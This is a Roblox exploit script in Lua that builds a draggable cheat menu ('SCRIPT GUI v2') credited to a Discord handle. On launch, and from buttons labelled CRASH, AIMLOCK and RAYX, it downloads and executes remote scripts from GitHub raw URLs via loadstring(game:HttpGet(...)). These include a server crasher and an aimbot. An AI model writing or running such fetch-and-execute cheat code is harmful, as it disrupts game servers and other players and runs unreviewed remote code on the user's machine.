local NotifyLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/vKhonshu/intro/main/ui"))()
NotifyLib.prompt('Loading..',5)
NotifyLib.prompt('Welcome!',5)
NotifyLib.prompt('xomnia#0001',5)

local ScreenGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local label = Instance.new("TextLabel")
local crash = Instance.new("TextButton")
local lock = Instance.new("TextButton")
local rayx = Instance.new("TextButton")
local label2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui

main.Name = "main"
main.Parent = ScreenGui
main.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
main.Position = UDim2.new(0.600403607, 0, 0.223048329, 0)
main.Size = UDim2.new(0, 556, 0, 343)
main.Active = true
main.Draggable = true

label.Name = "label"
label.Parent = main
label.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
label.BorderColor3 = Color3.fromRGB(85, 85, 127)
label.BorderSizePixel = 3
label.Size = UDim2.new(0, 556, 0, 62)
label.Font = Enum.Font.SourceSansSemibold
label.Text = "SCRIPT GUI v2"
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextSize = 60.000

crash.Name = "crash"
crash.Parent = main
crash.BackgroundColor3 = Color3.fromRGB(85, 85, 127)
crash.Position = UDim2.new(0.0195682049, 0, 0.596291184, 0)
crash.Size = UDim2.new(0, 533, 0, 50)
crash.Font = Enum.Font.SourceSansBold
crash.Text = "CRASH"
crash.TextColor3 = Color3.fromRGB(255, 255, 255)
crash.TextSize = 44.000
crash.MouseButton1Down:connect (function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
end)

lock.Name = "lock"
lock.Parent = main
lock.BackgroundColor3 = Color3.fromRGB(85, 85, 127)
lock.Position = UDim2.new(0.0195681453, 0, 0.407462388, 0)
lock.Size = UDim2.new(0, 533, 0, 50)
lock.Font = Enum.Font.SourceSansBold
lock.Text = "AIMLOCK"
lock.TextColor3 = Color3.fromRGB(255, 255, 255)
lock.TextSize = 44.000
lock.MouseButton1Down:connect (function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/manipulatedyou/riley/main/aimlock"))()
end)

rayx.Name = "rayx"
rayx.Parent = main
rayx.BackgroundColor3 = Color3.fromRGB(85, 85, 127)
rayx.Position = UDim2.new(0.0196226239, 0, 0.226773024, 0)
rayx.Size = UDim2.new(0, 533, 0, 50)
rayx.Font = Enum.Font.SourceSansBold
rayx.Text = "RAYX"
rayx.TextColor3 = Color3.fromRGB(255, 255, 255)
rayx.TextSize = 44.000
rayx.MouseButton1Down:connect (function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
end)

label2.Name = "label2"
label2.Parent = main
label2.BackgroundColor3 = Color3.fromRGB(85, 85, 127)
label2.Position = UDim2.new(0.0178240538, 0, 0.787504435, 0)
label2.Size = UDim2.new(0, 532, 0, 50)
label2.Font = Enum.Font.GothamSemibold
label2.Text = "xomnia#0001 add me pls"
label2.TextColor3 = Color3.fromRGB(255, 255, 255)
label2.TextSize = 30.000
